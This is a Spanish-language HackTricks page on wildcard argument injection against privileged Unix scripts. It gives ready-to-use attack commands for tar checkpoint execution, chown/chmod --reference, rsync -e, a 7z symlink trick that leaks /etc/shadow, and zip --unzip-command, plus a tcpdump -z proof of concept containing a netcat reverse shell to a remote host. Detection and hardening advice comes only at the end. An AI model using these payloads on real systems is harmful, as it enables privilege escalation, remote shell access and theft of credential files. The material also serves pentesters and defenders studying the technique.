# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> La inyección de **argumentos** con comodines (también conocida como *glob*) ocurre cuando un script privilegiado ejecuta un binario de Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … con un comodín sin comillas como `*`.
> Dado que el shell expande el comodín **antes** de ejecutar el binario, un atacante que puede crear archivos en el directorio de trabajo puede elaborar nombres de archivos que comiencen con `-` para que sean interpretados como **opciones en lugar de datos**, efectivamente contrabandeando banderas arbitrarias o incluso comandos.
> Esta página recopila las primitivas más útiles, investigaciones recientes y detecciones modernas para 2023-2025.

## chown / chmod

Puedes **copiar el propietario/grupo o los bits de permiso de un archivo arbitrario** abusando de la bandera `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Cuando el root luego ejecuta algo como:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` se inyecta, causando que *todos* los archivos coincidentes hereden la propiedad/permisos de `/root/secret``file`.

*PoC y herramienta*: [`wildpwn`](https://github.com/localh0t/wildpwn) (ataque combinado).
Vea también el clásico documento de DefenseCode para más detalles.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Ejecute comandos arbitrarios abusando de la función **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Una vez que root ejecuta por ejemplo `tar -czf /root/backup.tgz *`, `shell.sh` se ejecuta como root.

### bsdtar / macOS 14+

El `tar` por defecto en las versiones recientes de macOS (basado en `libarchive`) *no* implementa `--checkpoint`, pero aún puedes lograr la ejecución de código con la bandera **--use-compress-program** que te permite especificar un compresor externo.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Cuando un script privilegiado ejecuta `tar -cf backup.tar *`, se iniciará `/bin/sh`.

---

## rsync

`rsync` te permite anular el shell remoto o incluso el binario remoto a través de flags de línea de comandos que comienzan con `-e` o `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Si el root archiva más tarde el directorio con `rsync -az * backup:/srv/`, la bandera inyectada genera tu shell en el lado remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Incluso cuando el script privilegiado *defensivamente* antepone el comodín con `--` (para detener el análisis de opciones), el formato 7-Zip admite **archivos de lista de archivos** anteponiendo el nombre del archivo con `@`. Combinar eso con un symlink te permite *exfiltrar archivos arbitrarios*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Si root ejecuta algo como:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip intentará leer `root.txt` (→ `/etc/shadow`) como una lista de archivos y se detendrá, **imprimiendo el contenido en stderr**.

---

## zip

`zip` soporta la bandera `--unzip-command` que se pasa *verbatim* a la shell del sistema cuando se probará el archivo:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Inyecta la bandera a través de un nombre de archivo elaborado y espera a que el script de respaldo privilegiado llame a `zip -T` (probar archivo) en el archivo resultante.

---

## Binarios adicionales vulnerables a la inyección de comodines (lista rápida 2023-2025)

Los siguientes comandos han sido abusados en CTFs modernos y en entornos reales. La carga útil siempre se crea como un *nombre de archivo* dentro de un directorio escribible que luego será procesado con un comodín:

| Binario | Bandera a abusar | Efecto |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → `@file` arbitrario | Leer contenido del archivo |
| `flock` | `-c <cmd>` | Ejecutar comando |
| `git`   | `-c core.sshCommand=<cmd>` | Ejecución de comando a través de git sobre SSH |
| `scp`   | `-S <cmd>` | Generar programa arbitrario en lugar de ssh |

Estos primitivos son menos comunes que los clásicos de *tar/rsync/zip* pero vale la pena revisarlos al buscar.

---

## ganchos de rotación de tcpdump (-G/-W/-z): RCE a través de inyección de argv en envoltorios

Cuando un shell restringido o envoltorio de proveedor construye una línea de comando de `tcpdump` concatenando campos controlados por el usuario (por ejemplo, un parámetro de "nombre de archivo") sin una citación/validación estricta, puedes introducir banderas adicionales de `tcpdump`. La combinación de `-G` (rotación basada en tiempo), `-W` (limitar el número de archivos) y `-z <cmd>` (comando posterior a la rotación) da como resultado la ejecución arbitraria de comandos como el usuario que ejecuta tcpdump (a menudo root en dispositivos).

Precondiciones:

- Puedes influir en `argv` pasado a `tcpdump` (por ejemplo, a través de un envoltorio como `/debug/tcpdump --filter=... --file-name=<HERE>`).
- El envoltorio no sanitiza espacios o tokens con prefijo `-` en el campo del nombre de archivo.

PoC clásica (ejecuta un script de shell inverso desde una ruta escribible):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detalles:

- `-G 1 -W 1` fuerza una rotación inmediata después del primer paquete coincidente.
- `-z <cmd>` ejecuta el comando post-rotación una vez por rotación. Muchas compilaciones ejecutan `<cmd> <savefile>`. Si `<cmd>` es un script/intérprete, asegúrate de que el manejo de argumentos coincida con tu carga útil.

Variantes sin medios removibles:

- Si tienes alguna otra primitiva para escribir archivos (por ejemplo, un envoltorio de comando separado que permite la redirección de salida), coloca tu script en una ruta conocida y activa `-z /bin/sh /path/script.sh` o `-z /path/script.sh` dependiendo de la semántica de la plataforma.
- Algunos envoltorios de proveedores rotan a ubicaciones controlables por el atacante. Si puedes influir en la ruta rotada (symlink/traversal de directorios), puedes dirigir `-z` para ejecutar contenido que controlas completamente sin medios externos.

Consejos de endurecimiento para proveedores:

- Nunca pases cadenas controladas por el usuario directamente a `tcpdump` (o cualquier herramienta) sin listas de permitidos estrictas. Cita y valida.
- No expongas la funcionalidad `-z` en envoltorios; ejecuta tcpdump con una plantilla segura fija y desautoriza completamente las banderas adicionales.
- Reduce los privilegios de tcpdump (cap_net_admin/cap_net_raw solo) o ejecuta bajo un usuario no privilegiado dedicado con confinamiento de AppArmor/SELinux.

## Detección y Endurecimiento

1. **Desactiva el globbing de shell** en scripts críticos: `set -f` (`set -o noglob`) previene la expansión de comodines.
2. **Cita o escapa** argumentos: `tar -czf "$dst" -- *` *no* es seguro — prefiere `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Rutas explícitas**: Usa `/var/www/html/*.log` en lugar de `*` para que los atacantes no puedan crear archivos hermanos que comiencen con `-`.
4. **Menor privilegio**: Ejecuta trabajos de respaldo/mantenimiento como una cuenta de servicio no privilegiada en lugar de root siempre que sea posible.
5. **Monitoreo**: La regla predefinida de Elastic *Potential Shell via Wildcard Injection* busca `tar --checkpoint=*`, `rsync -e*`, o `zip --unzip-command` seguido inmediatamente por un proceso hijo de shell. La consulta EQL puede adaptarse para otros EDRs.

---

## Referencias

* Elastic Security – Regla detectada de Potential Shell via Wildcard Injection (última actualización 2025)
* Rutger Flohil – “macOS — Inyección de comodines de Tar” (18 de diciembre de 2024)
* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
* FiberGateway GR241AG – [Cadena de Explotación Completa](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
